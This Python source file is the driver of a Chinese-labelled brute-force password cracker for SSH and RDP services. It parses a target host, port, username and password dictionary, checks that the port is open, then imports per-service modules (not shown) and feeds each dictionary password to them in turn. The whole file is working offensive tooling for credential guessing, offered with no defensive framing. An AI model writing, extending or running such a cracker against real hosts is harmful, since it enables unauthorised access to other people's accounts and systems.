import os, sys, importlib, telnetlib
import argparse
from multiprocessing import Manager
import conf.defaultPort as defaultPort
sys.path.append('lib')

ROOTPATH = os.path.realpath('.')
DICTPATH = ROOTPATH + '/dict/'
class drill:
    def __init__(self):
        parser = argparse.ArgumentParser(description='小旋风爆破器')
        parser.add_argument('-host', '--host', type=str, help='主机地址')
        parser.add_argument('-port', '--port', type=str, help='端口')
        # parser.add_argument('-timeout', '--timeout', type=str, help='超时时间')
        # parser.add_argument('-threads', '--threads', type=str, help='线程数')
        parser.add_argument('-type', '--type', type=str, help='爆破类型: ssh/rdp')
        parser.add_argument('-username', '--username', type=str, help='用户名')
        # parser.add_argument('-password', '--password', type=str, help='密码')
        # parser.add_argument('-userfile', '--userfile', type=str, help='用户名字典文件')
        parser.add_argument('-passfile', '--passfile', type=str, help='密码字典文件')
        self.args = parser.parse_args()
        if self.args.host:
            self.run()


    def checkservice(self):
        try:
            telnetlib.Telnet(self.args.host, self.args.port)
            print("[+] %s:%s is open!" %(self.args.host,self.args.port))
        except:
            print("[+] %s:%s is not open!" %(self.args.host,self.args.port))
            exit(1)


    def loadfile(self):
        if not self.args.port:
            self.args.port = defaultPort.cracklist[self.args.type]
        try:
            self.username_queue = Manager().Queue()
            self.password_queue = Manager().Queue()
            # if self.args.userfile:
            #     print("[-]加载字典中；")
            #     with open(DICTPATH + self.args.userfile, 'r', encoding='utf-8') as f:
            #         for line in f:
            #             self.username_queue.put(line.strip())
            #     print("[+] %s -- 用户名字典已加载完成！" % self.args.userfile)
            if self.args.passfile:
                print("[-]加载字典中；")
                with open(DICTPATH + self.args.passfile, 'r', encoding='utf-8') as f:
                    for line in f:
                        self.password_queue.put(line.strip())
                print("[+] %s -- 密码字典已加载完成！" % self.args.passfile)
        except FileNotFoundError:
            print("[-]未找到该文件！")


    def run(self):
        self.loadfile()
        self.checkservice()
        while not self.password_queue.empty():
            password = self.password_queue.get()
            type_name=self.args.type+'drill'
            module_name=importlib.import_module(type_name)
            getattr(module_name, type_name)(self.args).run(self.args.username, password)

if __name__ == '__main__':
    drill()